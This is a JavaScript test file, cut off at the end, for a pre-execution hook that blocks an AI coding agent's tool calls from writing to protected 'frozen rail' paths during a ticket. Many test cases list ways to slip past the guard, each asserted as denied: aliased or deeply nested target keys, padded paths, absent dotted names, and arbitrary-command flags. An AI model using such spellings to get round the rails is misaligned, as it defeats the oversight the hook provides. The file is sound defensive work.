test('q: mutation opt-in flag on an allowlisted gate → deny (--write derives its targets)', () => {
  const dir = repo({ tickets: T1_RAILED });
  const env = { ...ON, ADLC_TICKET: 'T1' };
  try {
    const r = checkToolCall({ tool: 'adlc_gate', args: { gate: 'lesson-foundry', args: ['--write'] }, root: dir, env });
    assert.equal(r.decision, 'deny');
    assert.match(r.reason, /mutation flag/);
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

test('q: comma-separated list token hiding a rail path → deny', () => {
  const dir = repo({ tickets: T1_RAILED });
  const env = { ...ON, ADLC_TICKET: 'T1' };
  try {
    const r = checkToolCall({ tool: 'adlc_gate', args: { gate: 'parallax', args: ['--file', 'a.md,test/x.mjs'] }, root: dir, env });
    assert.equal(r.decision, 'deny');
    assert.match(r.reason, /frozen rail/);
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

test('q: read-only gates still flow under rails; everything unrestricted with rails OFF', () => {
  const dir = repo({ tickets: T1_RAILED });
  const env = { ...ON, ADLC_TICKET: 'T1' };
  try {
    for (const gate of ['spec-lint', 'coldstart', 'preflight', 'merge-forecast']) {
      assert.equal(checkToolCall({ tool: 'adlc_gate', args: { gate, args: ['--json'] }, root: dir, env }).decision, 'allow', gate);
    }
    // rails not in force (no active ticket) → even hollow-test is allowed through
    const off = checkToolCall({ tool: 'adlc_gate', args: { gate: 'hollow-test', args: ['--test-cmd', 'x'] }, root: dir, env: { ...ON } });
    assert.equal(off.decision, 'allow');
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

// ---- (r) round-3 re-review: the allowlist itself must reflect true read-only behavior ----
test('r: review-calibration via adlc_gate under rails → deny (mutate/restore writer, same class as hollow-test)', () => {
  const dir = repo({ tickets: T1_RAILED });
  const env = { ...ON, ADLC_TICKET: 'T1' };
  try {
    const r = checkToolCall({
      tool: 'adlc_gate',
      args: { gate: 'review-calibration', args: ['--commit', 'HEAD'] },
      root: dir, env,
    });
    assert.equal(r.decision, 'deny');
    assert.match(r.reason, /derives or defaults its write targets/);
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

test('r: --record-verdict writes the manifest ledger — denied when the ledger is railed, allowed otherwise', () => {
  const railedLedger = repo({ tickets: { tickets: [{ id: 'T1', rails: ['.adlc/**'] }] } });
  const normalRails = repo({ tickets: T1_RAILED }); // rails: test/**
  const env = { ...ON, ADLC_TICKET: 'T1' };
  try {
    for (const gate of ['coldstart', 'premortem', 'parallax']) {
      const denied = checkToolCall({ tool: 'adlc_gate', args: { gate, args: ['--prompt-only', '--record-verdict', '-'] }, root: railedLedger, env });
      assert.equal(denied.decision, 'deny', `${gate} vs railed ledger`);
      assert.match(denied.reason, /manifest\.jsonl/);
      const allowed = checkToolCall({ tool: 'adlc_gate', args: { gate, args: ['--prompt-only', '--record-verdict', '-'] }, root: normalRails, env });
      assert.equal(allowed.decision, 'allow', `${gate} with non-railed ledger`);
    }
  } finally {
    rmSync(railedLedger, { recursive: true, force: true });
    rmSync(normalRails, { recursive: true, force: true });
  }
});

test('r: model-ratchet --review-cmd is an ARBITRARY PROGRAM — denied under rails; plain dry-run allowed', () => {
  const dir = repo({ tickets: T1_RAILED });
  const env = { ...ON, ADLC_TICKET: 'T1' };
  try {
    // round-4 HIGH: the command can write ANY path, including the tickets.json
    // trust root — no ledger vet can catch it, so the flag class is denied.
    for (const argv of [['--review-cmd=true'], ['--review-cmd', 'node -e "hostile"']]) {
      const denied = checkToolCall({ tool: 'adlc_gate', args: { gate: 'model-ratchet', args: argv }, root: dir, env });
      assert.equal(denied.decision, 'deny', argv.join(' '));
      assert.match(denied.reason, /command-executor/);
    }
    const dryRun = checkToolCall({ tool: 'adlc_gate', args: { gate: 'model-ratchet', args: ['--dry-run'] }, root: dir, env });
    assert.equal(dryRun.decision, 'allow');
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

test('r: command-executor flags are denied for EVERY gate under rails (class, not instance)', () => {
  const dir = repo({ tickets: T1_RAILED });
  const env = { ...ON, ADLC_TICKET: 'T1' };
  try {
    const r = checkToolCall({ tool: 'adlc_gate', args: { gate: 'spec-lint', args: ['--test-cmd', 'true'] }, root: dir, env });
    assert.equal(r.decision, 'deny');
    assert.match(r.reason, /command-executor/);
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

test('r: preflight scratch probes are vetted — denied only when a probe path is railed', () => {
  const railedAdlc = repo({ tickets: { tickets: [{ id: 'T1', rails: ['.adlc/**'] }] } });
  const railedGit = repo({ tickets: { tickets: [{ id: 'T1', rails: ['.git/**'] }] } }); // round-5: branch/worktree metadata churn
  const normalRails = repo({ tickets: T1_RAILED }); // rails: test/**
  const env = { ...ON, ADLC_TICKET: 'T1' };
  try {
    for (const dir of [railedAdlc, railedGit]) {
      const denied = checkToolCall({ tool: 'adlc_gate', args: { gate: 'preflight', args: [] }, root: dir, env });
      assert.equal(denied.decision, 'deny');
      assert.match(denied.reason, /preflight-test/);
    }
    const allowed = checkToolCall({ tool: 'adlc_gate', args: { gate: 'preflight', args: [] }, root: normalRails, env });
    assert.equal(allowed.decision, 'allow');
  } finally {
    rmSync(railedAdlc, { recursive: true, force: true });
    rmSync(railedGit, { recursive: true, force: true });
    rmSync(normalRails, { recursive: true, force: true });
  }
});

// ---- (r) ungated-tool spoof defense sees target-keyed arguments ----
test('r: an ungated tool naming a frozen rail via target is denied', () => {
  const dir = repo({ tickets: T1_RAILED });
  try {
    // The spoof branch allows on ZERO extractable targets (task/skill carry no
    // path on nearly every call), so a spelling it cannot see is a hole rather
    // than a fail-closed default. extractTargets misses these three.
    // Spellings AND the shapes they arrive in: extractTargets walks files[]/
    // edits[] but reads only filePath/path/file inside their entries, so a
    // top-level-only check still let the nested forms through.
    for (const args of [
      { target: 'test/frozen.test.mjs' },
      { targetPath: 'test/frozen.test.mjs' },
      { target_path: 'test/frozen.test.mjs' },
      { targetFile: 'test/frozen.test.mjs' },
      { target_file: 'test/frozen.test.mjs' },
      { target: ['test/frozen.test.mjs'] },
      { edits: [{ target: 'test/frozen.test.mjs' }] },
      { edits: [{ targetPath: 'test/frozen.test.mjs' }] },
      { files: [{ target: 'test/frozen.test.mjs' }] },
      { batch: { nested: { target: 'test/frozen.test.mjs' } } },
      // No depth ceiling: a cap would itself be a bypass — nest past it and the
      // scan stops looking.
      { a: { b: { c: { d: { e: { f: { target: 'test/frozen.test.mjs' } } } } } } },
      { edits: [{ changes: [{ targetFile: 'test/frozen.test.mjs' }] }] },
      // A target may be an OBJECT: inside a target subtree a conventional path
      // field names the file just as plainly as a bare string does.
      { target: { path: 'test/frozen.test.mjs' } },
      { target: { filePath: 'test/frozen.test.mjs' } },
      { target: [{ path: 'test/frozen.test.mjs' }] },
    ]) {
      for (const tool of ['task', 'skill', 'todowrite']) {
        const r = checkToolCall({ tool, args, root: dir, env: { ...ON, ADLC_TICKET: 'T1' } });
        assert.equal(r.decision, 'deny', `${tool} ${JSON.stringify(args)} → ${r.reason}`);
        assert.match(r.reason, /frozen rail "test\/\*\*"/);
      }
    }
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

test('r: an ungated tool naming a non-rail target still runs', () => {
  const dir = repo({ tickets: T1_RAILED });
  try {
    for (const args of [
      { target: 'src/ok.mjs' },
      { targetPath: 'src/ok.mjs' },
      { target: ['src/ok.mjs'] },
      { edits: [{ target: 'src/ok.mjs' }] },
      { files: [{ target: 'src/ok.mjs' }] },
      // A non-target key holding rail-looking strings must NOT become a target,
      // or the spoof guard turns into an over-blocking string scanner.
      { notes: ['test/frozen.test.mjs'] },
      { target: { path: 'src/ok.mjs' } },
      // Target context does not leak: a path-shaped key OUTSIDE a target
      // subtree must not start collecting arbitrary nested strings.
      { path: { deep: 'test/frozen.test.mjs' } },
      { meta: { path: 'test/frozen.test.mjs' } },
      { description: 'edit test/frozen.test.mjs later' },
      {},
    ]) {
      const r = checkToolCall({ tool: 'task', args, root: dir, env: { ...ON, ADLC_TICKET: 'T1' } });
      assert.equal(r.decision, 'allow', `${JSON.stringify(args)} → ${r.reason}`);
    }
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

test('r: extractTargets still does not read target — the breadth is spoof-only', () => {
  // Guards the trade-off this fix was scoped around: teaching extractTargets to
  // read `target` would turn a fail-closed deny into an allow on the
  // mutating/unknown branch, which denies when nothing is extractable.
  assert.deepEqual(extractTargets({ target: 'a' }), []);
  assert.deepEqual(extractTargets({ targetPath: 'a' }), []);
  assert.deepEqual(extractTargets({ target_path: 'a' }), []);
  assert.deepEqual(extractTargets({ edits: [{ target: 'a' }] }), []);
  assert.deepEqual(spoofCandidateTargets({ target: 'a' }), ['a']);
  assert.deepEqual(spoofCandidateTargets({ edits: [{ target: 'a' }] }), ['a']);
  assert.deepEqual(spoofCandidateTargets({ target: ['a'] }), ['a']);
  assert.deepEqual(spoofCandidateTargets({ notes: ['a'] }), []);
  assert.deepEqual(spoofCandidateTargets({ target: { path: 'a' } }), ['a']);
  assert.deepEqual(spoofCandidateTargets({ target: [{ filePath: 'a' }] }), ['a']);
  assert.deepEqual(spoofCandidateTargets({ path: { deep: 'a' } }), []);
  // A path field OUTSIDE a target subtree, nested where extractTargets cannot
  // see it either: this is the boundary between the spoof guard and a general
  // string scanner, and it is deliberate rather than incidental.
  assert.deepEqual(spoofCandidateTargets({ meta: { path: 'a' } }), []);
  assert.deepEqual(spoofCandidateTargets({ meta: { filePath: 'a' } }), []);
  assert.deepEqual(spoofCandidateTargets({ meta: { target: 'a' } }), ['a']);
  // Blank entries are not targets: railHit('') would be a silent no-op, so an
  // empty string in the list looks like coverage without being any.
  assert.deepEqual(spoofCandidateTargets({ target: ['', '   ', 'a'] }), ['a']);
  assert.deepEqual(spoofCandidateTargets({ target: '   ' }), []);
  // Non-object children must be skipped, not walked into.
  assert.deepEqual(spoofCandidateTargets({ target: null }), []);
  assert.deepEqual(spoofCandidateTargets({ a: null, b: 3, c: undefined, target: 'x' }), ['x']);
  // Self-referencing args terminate rather than hanging the gate.
  const cyclic = { target: 'a' };
  cyclic.self = cyclic;
  assert.deepEqual(spoofCandidateTargets(cyclic), ['a']);
  assert.deepEqual(spoofCandidateTargets({ path: 'b', target: 'a' }), ['b', 'a']);
  assert.deepEqual(spoofCandidateTargets({}), []);
});

test('r: an object aliased outside the target subtree still yields its target-context candidates', () => {
  // Cross-model finding (codex): `seen` tracked object identity alone, while
  // what a visit collects depends on the (inTarget, dirKeyed) context. With ONE
  // object aliased under both a non-target and a target key, the non-target
  // visit pops first (the stack is LIFO), marks the object seen, and the
  // target-context visit is skipped — the rail target is never collected.
  const shared = { path: 'a' };
  assert.deepEqual(spoofCandidateTargets({ target: shared, other: shared }), ['a']);
  assert.deepEqual(spoofCandidateTargets({ other: shared, target: shared }), ['a']);
  // Directory provenance survives aliasing too: dirKeyed is part of the context
  // a revisit must re-establish, not just target-ness.
  const sharedList = ['docs'];
  const viaDir = spoofCandidates({ target_dir: sharedList, other: sharedList });
  assert.deepEqual(viaDir.targets, ['docs']);
  assert.ok(viaDir.directories.has('docs'));
  // An aliased cycle across contexts still terminates: each object is visited
  // at most once per (inTarget, dirKeyed) context.
  const cyc = {};
  cyc.target = cyc;
  cyc.other = cyc;
  assert.deepEqual(spoofCandidateTargets(cyc), []);
});

test('r: aliased args cannot slip an ungated tool past an active rail', () => {
  const dir = repo({ tickets: T1_RAILED });
  try {
    const shared = { path: 'test/frozen.test.mjs' };
    const r = checkToolCall({ tool: 'task', args: { target: shared, other: shared }, root: dir, env: { ...ON, ADLC_TICKET: 'T1' } });
    assert.equal(r.decision, 'deny', r.reason);
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

test('r: an ABSENT path keeps ancestor detection on the ungated branch, whatever key named it', () => {
  // AMENDED DELIBERATELY under ticket T-01M0QGCCGMH484DBVTC7CJ7168 (GitHub #498).
  // This block used to pin ALLOW for the shapes below. A file-specific KEY plus a
  // dotted leaf licensed namesAFile's extension guess for a path that does not
  // exist, which selected ancestors:'literal' and stopped an anchored `**` from
  // absorbing the target's last segment. But on THIS branch "it is a file" is a
  // claim by the caller the branch exists to distrust, and the guess turned four
  // shapes that DENIED in every release through v1.10.0 into allows — the only
  // fail-open regression in the 1.11.0 window. The spec decision restores the
  // v1.10.0 deny: an absent path gets full ancestor detection here regardless of
  // key. The over-denial that trades back in is the shipped, field-tolerated
  // behavior, and a benign ungated tool has no business carrying a file-path arg.
  //
  // NOT reverted: a path the filesystem RESOLVES. A stat is evidence rather than
  // a claim, so an existing file still takes the narrowed mode and still runs —
  // pinned at the end of this test and against `src/Makefile` further down.
  const dir = repo({ tickets: { tickets: [{ id: 'T1', rails: ['src/**/test/*.mjs'] }] } });
  try {
    // The four regression shapes from the ticket's A/B, plus the two the same
    // license covered: the apply_patch envelope (a regression like the four) and
    // `targetFile`, which v1.10.0 never collected at all — leaving that one
    // allowed would just be the same hole under a different spelling.
    for (const args of [
      { targetFile: 'src/index.mjs' },
      { filePath: 'src/index.mjs' },
      { file: 'src/index.mjs' },
      { files: ['src/index.mjs'] },
      { edits: [{ filePath: 'src/index.mjs' }] },
      // A patch envelope names the FILES it updates — as file-specific a
      // statement as any key, and the shape apply_patch arrives in.
      { patch: '*** Begin Patch\n*** Update File: src/index.mjs\n*** End Patch\n' },
    ]) {
      const r = checkToolCall({ tool: 'task', args, root: dir, env: { ...ON, ADLC_TICKET: 'T1' } });
      assert.equal(r.decision, 'deny', `${JSON.stringify(args)} → ${r.reason}`);
    }
    // The ambiguous keys deny for the older reason — ambiguity resolves to
    // DIRECTORY — and keep denying after #498. Pinned separately because the two
    // sides now agree: a later change that re-licensed the file guess would flip
    // the block above without touching this one.
    //
    // `path` sits on the ambiguous side: it is the key a caller reaches for when
    // passing a DIRECTORY, so it may not assert file-ness. `targetPath` is the
    // same word with a target prefix.
    for (const args of [{ target: 'src/index.mjs' }, { path: 'src/index.mjs' }, { targetPath: 'src/index.mjs' }, { edits: [{ path: 'src/index.mjs' }] }]) {
      const ambiguous = checkToolCall({ tool: 'task', args, root: dir, env: { ...ON, ADLC_TICKET: 'T1' } });
      assert.equal(ambiguous.decision, 'deny', `${JSON.stringify(args)} → ${ambiguous.reason}`);
    }
    // Provenance merges CONSERVATIVELY across the deduplicated candidate: one
    // ambiguous spelling revokes the file assertion another key made about the
    // same path, so a caller cannot shed the ancestor check by ADDING an alias.
    // Both property orders, because a walk order that only works one way is the
    // same defect waiting for a different serializer.
    for (const args of [
      { target: 'src/index.mjs', filePath: 'src/index.mjs' },
      { filePath: 'src/index.mjs', target: 'src/index.mjs' },
      { files: ['src/index.mjs'], path: 'src/index.mjs' },
      { targetFile: 'src/index.mjs', edits: [{ path: 'src/index.mjs' }] },
    ]) {
      const aliased = checkToolCall({ tool: 'task', args, root: dir, env: { ...ON, ADLC_TICKET: 'T1' } });
      assert.equal(aliased.decision, 'deny', `${JSON.stringify(args)} → ${aliased.reason}`);
    }
    // Padding is a spelling, not a different path: a tool that trims its input
    // would act on the frozen one. Checked on the mutating branch too, which is
    // the branch that actually writes.
    for (const [tool, args] of [
      ['task', { target: ' src/app/test/a.mjs ' }],
      ['task', { filePath: 'src/app/test/a.mjs ' }],
      ['task', { edits: [{ target: '  src/app/test/a.mjs' }] }],
      ['write', { filePath: ' src/app/test/a.mjs ' }],
      ['custom_writer', { path: ' src/app/test/a.mjs ' }],
    ]) {
      const padded = checkToolCall({ tool, args, root: dir, env: { ...ON, ADLC_TICKET: 'T1' } });
      assert.equal(padded.decision, 'deny', `${tool} ${JSON.stringify(args)} → ${padded.reason}`);
    }
    // A stat flips every one of them: this is the surviving witness that the
    // narrowed ('literal') mode is still reachable from the hook at all, and the
    // over-block requirement 3 exists to prevent is still fixed for a file that
    // is actually there.
    mkdirSync(join(dir, 'src'), { recursive: true });
    writeFileSync(join(dir, 'src', 'index.mjs'), '');
    for (const args of [{ target: 'src/index.mjs' }, { filePath: 'src/index.mjs' }, { files: ['src/index.mjs'] }]) {
      const stated = checkToolCall({ tool: 'task', args, root: dir, env: { ...ON, ADLC_TICKET: 'T1' } });
      assert.equal(stated.decision, 'allow', `an existing file is resolved by stat → ${stated.reason}`);
    }
    // A file the rail actually matches, and a DIRECTORY that holds one, both stay denied.
    for (const args of [{ target: 'src/app/test/a.mjs' }, { target: 'src' }]) {
      const r = checkToolCall({ tool: 'task', args, root: dir, env: { ...ON, ADLC_TICKET: 'T1' } });
      assert.equal(r.decision, 'deny', `${JSON.stringify(args)} → ${r.reason}`);
    }
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

test('r: #498 — the v1.10.0 deny is restored for an absent dotted path, the target/targetDir denies are kept', () => {
  // Ticket T-01M0QGCCGMH484DBVTC7CJ7168. Drives the exact A/B recorded on the
  // issue: rail `src/**/test/*.mjs`, ungated tool, absent target `src/new.bundle`.
  // Held against the SHAPES rather than the internals so that any future route
  // to the same allow — a new key spelling, a new envelope, a re-licensed guess —
  // reddens here even if the mechanism changes.
  const dir = repo({ tickets: { tickets: [{ id: 'T1', rails: ['src/**/test/*.mjs'] }] } });
  try {
    const env = { ...ON, ADLC_TICKET: 'T1' };
    // v1.10.0 DENY → main ALLOW. These four are the regression.
    for (const args of [
      { filePath: 'src/new.bundle' },
      { file: 'src/new.bundle' },
      { files: ['src/new.bundle'] },
      { edits: [{ filePath: 'src/new.bundle' }] },
    ]) {
      const r = checkToolCall({ tool: 'task', args, root: dir, env });
      assert.equal(r.decision, 'deny', `v1.10.0 parity: ${JSON.stringify(args)} → ${r.reason}`);
    }
    // v1.10.0 ALLOW → main DENY: an in-window IMPROVEMENT this fix must not undo.
    // `target` is ambiguous and `targetDir` says directory outright; both keep
    // ancestor detection, and neither was reachable as a spoof candidate at all
    // before the 1.11.0 work.
    for (const args of [{ target: 'src/new.bundle' }, { targetDir: 'src/new.bundle' }]) {
      const r = checkToolCall({ tool: 'task', args, root: dir, env });
      assert.equal(r.decision, 'deny', `improvement kept: ${JSON.stringify(args)} → ${r.reason}`);
    }
    // The GATED branch is untouched: a structured mutator takes the singleFile
    // path, which never asks the ancestor question, so an absent non-rail file
    // still writes — and a real rail match still denies there.
    assert.equal(checkToolCall({ tool: 'write', args: { filePath: 'src/new.bundle' }, root: dir, env }).decision, 'allow');
    assert.equal(checkToolCall({ tool: 'write', args: { filePath: 'src/app/test/a.mjs' }, root: dir, env }).decision, 'deny');
    // …and the ungated branch has not become a blanket deny: a path the rail
    // cannot reach in any ancestor form still runs.
    assert.equal(checkToolCall({ tool: 'task', args: { filePath: 'other/new.bundle' }, root: dir, env }).decision, 'allow');
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

test('r: namesAFile prefers the filesystem and falls back to the name', () => {
  const dir = repo({ tickets: T1_RAILED });
  try {
    mkdirSync(join(dir, 'src'), { recursive: true });
    writeFileSync(join(dir, 'src', 'index.mjs'), '');
    assert.equal(namesAFile('.adlc', dir), false, 'an existing directory is not a file');
    assert.equal(namesAFile('src/index.mjs', dir), true, 'an existing file is a file');
    // A target that does not exist yet — a tool is about to create it — falls
    // back to the name.
    assert.equal(namesAFile('src/new.mjs', dir, { fileKeyed: true }), true);
    assert.equal(namesAFile('src/newdir', dir, { fileKeyed: true }), false);
  } finally { rmSync(dir, { recursive: true, force: true }); }

  const absent = '/nonexistent-root-for-heuristic';
  // Absent path: the extension heuristic runs ONLY for a file-specific key.
  for (const f of ['a.mjs', 'src/index.mjs', '/abs/x.json', 'a/b.test.mjs']) {
    assert.equal(namesAFile(f, absent, { fileKeyed: true }), true, f);
    assert.equal(namesAFile(f, absent), false, `${f} is ambiguous without a file-specific key`);
  }
  for (const d of ['src', 'test/', 'a/b/c', '']) {
    assert.equal(namesAFile(d, absent, { fileKeyed: true }), false, d);
  }
  // A LEADING dot is a hidden name, not an extension. Reading these as files
  // would switch off ancestor detection for the trees most likely to hold rails.
  for (const d of ['.adlc', '.github', '.claude', '.adlc/handoffs']) {
    assert.equal(namesAFile(d, absent, { fileKeyed: true }), false, d);
  }
  // Trailing bare dot is not an extension either.
  assert.equal(namesAFile('a.', absent, { fileKeyed: true }), false);
  // Digits past 1 are still extension characters — .mp3/.7z name files.
  for (const f of ['song.mp3', 'a.7z', 'v.h264']) {
    assert.equal(namesAFile(f, absent, { fileKeyed: true }), true, f);
  }
});

test('r: an existing dotted-name DIRECTORY is not a file, by either spelling', () => {
  // The one case where the filesystem and the name heuristic disagree: a real
  // directory whose leaf looks like it carries an extension. Pins that the stat
  // wins, for a relative path AND for an absolute one resolved against a
  // different root.
  const dir = repo({ tickets: T1_RAILED });
  try {
    mkdirSync(join(dir, 'assets.bundle'), { recursive: true });
    writeFileSync(join(dir, 'assets.bundle', 'x.mjs'), '');
    assert.equal(namesAFile('assets.bundle', dir), false, 'relative');
    assert.equal(namesAFile(join(dir, 'assets.bundle'), dir), false, 'absolute, same root');
    assert.equal(namesAFile(join(dir, 'assets.bundle'), '/nonexistent-other-root'), false, 'absolute, other root');
    assert.equal(namesAFile(join(dir, 'assets.bundle', 'x.mjs'), '/nonexistent-other-root', { fileKeyed: true }), true, 'absolute file');
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

test('r: a dot-directory holding a rail keeps ancestor detection', () => {
  const dir = repo({ tickets: { tickets: [{ id: 'T1', rails: ['.adlc/handoffs/**'] }] } });
  try {
    mkdirSync(join(dir, '.adlc', 'handoffs'), { recursive: true });
    const r = checkToolCall({ tool: 'task', args: { target: '.adlc' }, root: dir, env: { ...ON, ADLC_TICKET: 'T1' } });
    assert.equal(r.decision, 'deny', r.reason);
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

test('r: a directory-named key keeps ancestor detection even when it looks dotted', () => {
  // namesAFile can only guess for a path that does not exist yet, and guesses
  // "file" for any dotted leaf. targetDir says directory outright, and a
  // trailing slash is the caller saying so too.
  const dir = repo({ tickets: { tickets: [{ id: 'T1', rails: ['assets.bundle/**'] }] } });
  try {
    for (const args of [
      { targetDir: 'assets.bundle' },
      { targetDir: 'assets.bundle/' },
      { targetDirectory: 'assets.bundle' },
      { target: 'assets.bundle/' },
      { edits: [{ targetDir: 'assets.bundle' }] },
    ]) {
      const r = checkToolCall({ tool: 'task', args, root: dir, env: { ...ON, ADLC_TICKET: 'T1' } });
      assert.equal(r.decision, 'deny', `${JSON.stringify(args)} → ${r.reason}`);
    }
    const ok = checkToolCall({ tool: 'task', args: { targetDir: 'other.bundle' }, root: dir, env: { ...ON, ADLC_TICKET: 'T1' } });
    assert.equal(ok.decision, 'allow', ok.reason);
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

test('r: a generic path key does not assert file-ness, so a rail parent still hits', () => {
  // File provenance is per KEY, not per extractor. `path` is what a caller
  // reaches for when naming a directory, so bulk-marking every extractTargets
  // result as file-provenanced switched ancestor detection off for it and let a
  // rail's own parent directory through under an absent dotted name.
  const dir = repo({ tickets: { tickets: [{ id: 'T1', rails: ['assets.bundle/**'] }] } });
  try {
    for (const args of [
      { path: 'assets.bundle' },
      { edits: [{ path: 'assets.bundle' }] },
      { files: [{ path: 'assets.bundle' }] },
      { edits: ['assets.bundle'] },
      { target: { path: 'assets.bundle' } },
    ]) {
      const r = checkToolCall({ tool: 'task', args, root: dir, env: { ...ON, ADLC_TICKET: 'T1' } });
      assert.equal(r.decision, 'deny', `${JSON.stringify(args)} → ${r.reason}`);
      assert.match(r.reason, /frozen rail "assets\.bundle\/\*\*"/);
    }
    // A key that asserts file-ness does NOT rescue this one, because the rail
    // set contradicts it: `assets.bundle/**` states that `assets.bundle` is a
    // directory, and the rails are the trusted side of that disagreement. Only
    // the `**`-absorbed ancestor form is dropped for a claimed file — see the
    // interior-wildcard test above, where the rails say nothing about the
    // target and it is allowed.
    for (const args of [
      { filePath: 'assets.bundle' },
      { file: 'assets.bundle' },
      { files: ['assets.bundle'] },
      { targetFile: 'assets.bundle' },
    ]) {
      const r = checkToolCall({ tool: 'task', args, root: dir, env: { ...ON, ADLC_TICKET: 'T1' } });
      assert.equal(r.decision, 'deny', `${JSON.stringify(args)} → ${r.reason}`);
    }
    // …and a stat still overrules the key, in both directions.
    mkdirSync(join(dir, 'assets.bundle'), { recursive: true });
    const stated = checkToolCall({ tool: 'task', args: { filePath: 'assets.bundle' }, root: dir, env: { ...ON, ADLC_TICKET: 'T1' } });
    assert.equal(stated.decision, 'deny', `an existing directory is not a file → ${stated.reason}`);
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

test('r: a claimed file is still denied when the rail NAMES it past a zero-width **', () => {
  // End-to-end form of the narrowed-ancestor boundary. `src/cache.bundle` is
  // absent and dotted, so a file-specific key gets it classified as a claimed
  // file — but `src/**/cache.bundle/**` names it outright once the `**` takes
  // zero segments, and the rail set outranks the claim.
  const dir = repo({ tickets: { tickets: [{ id: 'T1', rails: ['src/**/cache.bundle/**'] }] } });
  try {
    const env = { ...ON, ADLC_TICKET: 'T1' };
    for (const args of [
      { filePath: 'src/cache.bundle' },
      { targetFile: 'src/cache.bundle' },
      { files: ['src/cache.bundle'] },
      // …and with the ** absorbing a segment on the way, which is no less a
      // naming of the last one.
      { filePath: 'src/foo/cache.bundle' },
      { filePath: 'src/foo/bar/cache.bundle' },
    ]) {
      const r = checkToolCall({ tool: 'task', args, root: dir, env });
      assert.equal(r.decision, 'deny', `${JSON.stringify(args)} → ${r.reason}`);
    }
    // The over-block requirement 3 removed stays removed: here only the `**`
    // relates the rail to the target, so a file still runs. Since #498 the claim
    // has to be backed by a stat on this branch — an ABSENT `src/index.mjs` is
    // over-denied here, which is the v1.10.0 behavior the ticket restored.
    const absent = checkToolCall({ tool: 'task', args: { filePath: 'src/index.mjs' }, root: dir, env });
    assert.equal(absent.decision, 'deny', absent.reason);
    mkdirSync(join(dir, 'src'), { recursive: true });
    writeFileSync(join(dir, 'src', 'index.mjs'), '');
    const unrelated = checkToolCall({ tool: 'task', args: { filePath: 'src/index.mjs' }, root: dir, env });
    assert.equal(unrelated.decision, 'allow', unrelated.reason);
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

test('r: a padded spelling is classified on the same paths it is matched on', () => {
  // The classification and the rail matching must read the same list of
  // spellings. A padded ` src/cache.bundle` misses the stat that finds the real
  // directory and reads as an absent dotted FILE, while railHit goes on to
  // match the trimmed spelling — so classifying the raw form alone handed the
  // narrowed ancestor mode a directory and dropped the check.
  const dir = repo({ tickets: { tickets: [{ id: 'T1', rails: ['src/**/test/*.mjs'] }] } });
  try {
    const env = { ...ON, ADLC_TICKET: 'T1' };
    mkdirSync(join(dir, 'src', 'cache.bundle'), { recursive: true });
    for (const spelling of [' src/cache.bundle', 'src/cache.bundle ', '  src/cache.bundle  ', 'src/cache.bundle']) {
      const r = checkToolCall({ tool: 'task', args: { filePath: spelling }, root: dir, env });
      assert.equal(r.decision, 'deny', `${JSON.stringify(spelling)} → ${r.reason}`);
    }
    // The conservative merge costs the file claim outright: a padded spelling
    // is not a name the heuristic can read, so the target keeps full ancestor
    // detection and an absent file named this way is over-denied. Cheap and
    // correct-direction — the caller passed a path with padding on it, and
    // trimming it is one edit.
    const padded = checkToolCall({ tool: 'task', args: { filePath: ' src/index.mjs ' }, root: dir, env });
    assert.equal(padded.decision, 'deny', padded.reason);
    // It does NOT turn every padded path into a rail hit, which would make the
    // guard useless rather than strict.
    const unrelated = checkToolCall({ tool: 'task', args: { filePath: ' other/thing.mjs ' }, root: dir, env });
    assert.equal(unrelated.decision, 'allow', unrelated.reason);
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

test('r: narrowed ancestor matching stays linear on a hostile target path', () => {
  // Each ** explores every remaining target position. Without memoizing the
  // (target, rail) state that is combinatorial in the number of globstars over
  // an ATTACKER-CONTROLLED path, inside a synchronous pre-execution hook: this
  // input took minutes before, and a caller only has to name a long path.
  // Sized past where the quadratic form gave out: 16k segments took ~8s with a
  // per-state suffix scan and minutes with none, against ~10ms once each state
  // is visited once. The ceiling therefore has two orders of magnitude of
  // headroom, so this fails on an asymptotic regression rather than on a slow
  // machine.
  const target = `a/${Array.from({ length: 16000 }, (_, i) => `s${i}`).join('/')}`;
  const started = process.hrtime.bigint();
  for (const rail of ['a/**/z/**', 'a/**/**/z/**', 'a/**/**/**/z/**']) {
    assert.equal(targetIsRailAncestor(target, rail, { throughDoubleStar: false }), false, rail);
  }
  const elapsedMs = Number(process.hrtime.bigint() - started) / 1e6;
  assert.ok(elapsedMs < 2000, `narrowed ancestor walk took ${elapsedMs | 0}ms`);
  // And the hook still ANSWERS on that path rather than hanging. Since #498 an
  // absent path takes the full walk on the ungated branch — a caller can no
  // longer hand the narrowed walk a 16k-segment target at all, because only a
  // stat selects it now and a 16k-deep file cannot be created — so the narrowed
  // walk's bound is asserted directly above and the hook covers the full one.
  // Asserted for its DECISION only: the rest of checkToolCall canonicalizes and
  // symlink-resolves a 100KB path, which dominates the timing and would make a
  // ceiling here a measurement of the filesystem rather than of either walk.
  const dir = repo({ tickets: { tickets: [{ id: 'T1', rails: ['a/**/**/z/**'] }] } });
  try {
    const r = checkToolCall({ tool: 'task', args: { filePath: `${target}/x.mjs` }, root: dir, env: { ...ON, ADLC_TICKET: 'T1' } });
    assert.equal(r.decision, 'deny', r.reason);
    // A path the rail cannot reach in ANY ancestor form still runs, so the
    // hostile-length input is decided rather than blanket-denied.
    const unrelated = checkToolCall({ tool: 'task', args: { filePath: `b/${target}/x.mjs` }, root: dir, env: { ...ON, ADLC_TICKET: 'T1' } });
    assert.equal(unrelated.decision, 'allow', unrelated.reason);
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

test('r: ancestor detection never misses a rail globMatch can reach', () => {
  // Enumerating shapes stopped converging: five review rounds each produced one
  // more rail spelling this predicate read differently from the matcher that
  // decides direct hits. So state the invariant behind all of them and check it
